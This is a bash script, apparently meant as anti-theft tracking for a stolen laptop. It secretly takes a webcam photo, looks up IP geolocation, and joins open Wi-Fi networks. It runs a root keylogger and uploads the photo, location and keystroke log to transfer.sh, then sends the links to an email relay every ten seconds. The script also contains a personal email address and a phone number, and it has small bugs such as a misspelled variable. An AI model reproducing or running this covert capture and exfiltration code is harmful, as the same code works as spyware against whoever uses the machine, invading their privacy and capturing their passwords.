#!/bin/bash

get_camera_shot() {
	camera_shot=/tmp/camera_shot.jpg
	[[ -f $camera_shot ]] && rm $camera_shot
	ffmpeg -f video4linux2 -s 1280x720 -i /dev/video0 -ss 3 -frames 1 $camera_shot &> /dev/null
}

connect_to_wifi() {
	ping_count=3

	while
		echo "checking connection.."
		#sleep 10
		gotten_count=$(ping -c $ping_count google.com 2> /dev/null |
			awk '/time=/ { c++ } END { print c }')
		((gotten_count != ping_count))
	do
		echo "no connection.."
		ssid=$(nmcli device wifi list |
			awk '{
					if (NR == 1) {
						ssid_index = index($0, " SSID") + 1
						mode_index = index($0, " MODE") + 1
						signal_index = index($0, " SIGNAL") + 1
					} else if ($NF == "--") {
						ssid = substr($0, ssid_index, mode_index - ssid_index)
						signal = substr($0, signal_index, 3)
						#gsub("^ *| *$", "", ssid)
						sub(" *$", "", ssid)
						all_networks[signal] = ssid
					}
				} END {
					asort(all_networks)
					print all_networks[length(all_networks)]
					#for (ni in all_networks) print all_networks[ni]
				}')

		nmcli device wifi connect "$ssid"
	done
}

get_geolocation() {
	#IFS=',' read lat long city <<< $(curl -s https://ipinfo.io | jq -r '.loc + "," + .city')
	local iplocation=/tmp/.iplocation.txt
	curl -s https://ipinfo.io | jq -r '.loc + "," + .city' > $iplocation

	local links
	for file in $camera_shot $iplocation; do
		file_link=$(curl -s --upload-file $file https://transfer.sh/${file##*/})
		links+="${file##*/}: $file_link "
		echo ${file^^}: $file_link
	done

	curl --data "$links" \
		https://batsign.me/at/chadha_krish@hotmail.com/afbf4e70ab
		#https://batsign.me/at/thegreyhats@proton.me/57b69a2472

	server=192.168.1.10
	capture_dir=Downloads/capture
	#scp $camera_shot $server:$capture_dir
	#echo "$city: $lat, $long" |
	#	ssh $server "cat >> $capture_dir/iplocations"
}

start_keylogger() {
	local minutes=10
	local log_file=/var/log/logkeys.log
	[[ -f $log_file ]] && sudo rm -f $log_file

	local pid=$(pidof logkeys)
	#((pid)) && kill $pid
	((pid)) && sudo logkeys -k

	sudo logkeys -s -m /tmp/en_US_ubuntu_1204.map
	sudo chmod a+r $log_file

	echo "keylogger started.."

	while true; do
		#sleep $((minutes * 60))
		sleep 10

		log_link=$(curl -s --upload-file $log_file \
			https://transfer.sh/${log_file##*})
		curl --data "keylogger_link: $log_link" \
			https://batsign.me/at/chadha_krish@hotmail.com/afbf4e70ab
			#https://batsign.me/at/thegreyhats@proton.me/57b69a2472
	done
}

set_bootloader_image() {
	bootloader_img=bootloader_image.png
	bootloader_message='THIS LAPTOP WAS STOLEN\n'
	bootloader_message+='Please contact me on this number:(Krish Chadha) 416-999-9999\n'
	bootloader_message+='$100 cash reward for returning'

	resolution=$(xrandr -q | awk '$2 == "connected" { sub("\\+.*", "", $4); print $4 }')

	convert -size $resolution xc:'#111' -gravity center \
		 -font 'Iosevka-Orw'  -fill white -pointsize 59 \
		 -annotate +0+0 "$bootloader_message" $bootloader_img

	grub_cfg=/etc/default/grub
	script_path="$(readlink -f $0)"
	script_dir="${script_path%/*}"
	bg_exists=$(sudo awk '/^#?BACKGROUND/ { print 1 }' $grug_cfg)
	((bg_exists)) &&
		sed_command="\$a BACKGROUND=\"$script_dir/$bootloader_img\"" ||
		sed_command="/BACKGROUND/ { s|^#\?||; s|\".*\"|\"$script_dir/$bootloader_img\"| }"
	sudo sed -i "$sed_command" $grub_cfg
	#sed -i "/BACKGROUND/ { s|^#\?||; s|\".*\"|\"$script_dir/$bootloader_img\"| }" $grub_cfg
	#sudo update-grub
}

get_camera_shot
get_geolocation
connect_to_wifi
#set_bootloader_image
start_keylogger
